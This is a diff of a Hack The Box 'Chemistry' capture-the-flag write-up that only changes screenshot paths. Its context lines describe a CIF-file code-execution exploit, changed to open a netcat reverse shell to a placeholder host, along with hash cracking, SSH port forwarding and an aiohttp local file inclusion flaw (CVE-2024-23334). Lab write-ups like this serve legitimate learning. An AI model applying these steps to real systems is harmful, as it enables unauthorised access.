@@ -70,7 +70,7 @@ quickly researching 'cif exploit' leads me to:
 
 I can execute arbitrary code using this exploit.I modified POC slightly to check if it works or not:
 
-![NMAP](/static/writeups/chemistry/6.png)
+![NMAP](/static/writeups/HTB-S-VI/chemistry/6.png)
 
 changed "touch pwned" to "nc your-ip your-port"
 and open netcat listener and upload it via upload functionality.
@@ -85,19 +85,19 @@ when i was executing above exploit i notice username `rosa` in `/home` directory
 
 i ran hashid to identify hash and hashcat to crack it.
 
-![NMAP](/static/writeups/chemistry/1.png)
+![NMAP](/static/writeups/HTB-S-VI/chemistry/1.png)
 
 so, now with password and username, i successfully ssh into machine and got user flag
 :
 
-![NMAP](/static/writeups/chemistry/2.png)
+![NMAP](/static/writeups/HTB-S-VI/chemistry/2.png)
 
 ### Part 2: Root Flag
 
 We already got user and user flag. now, to get root flag I looked for open ports using:
 ss -tunlp
 
-![NMAP](/static/writeups/chemistry/3.png)
+![NMAP](/static/writeups/HTB-S-VI/chemistry/3.png)
 
 I found out another website was running locally in port 8080.
 so, i forwarded port using ssh:
@@ -108,14 +108,14 @@ ssh -L myport:boxip:boxport user@boxip
 
 I found out new website:
 
-![NMAP](/static/writeups/chemistry/4.png)
+![NMAP](/static/writeups/HTB-S-VI/chemistry/4.png)
 
-![NMAP](/static/writeups/chemistry/5.png)
+![NMAP](/static/writeups/HTB-S-VI/chemistry/5.png)
 
 which was using aiohttp version 3.9.1, quick research shows me it is vulnerable to local file inclusion. [Github Link](https://github.com/z3rObyte/CVE-2024-23334-PoC)
 so i looked at webpage source page and found `/assets` directory and made my exploit according to it (You can do it manually too):
 
-![NMAP](/static/writeups/chemistry/7.png)
+![NMAP](/static/writeups/HTB-S-VI/chemistry/7.png)
 
 by running it i found root flag.
 
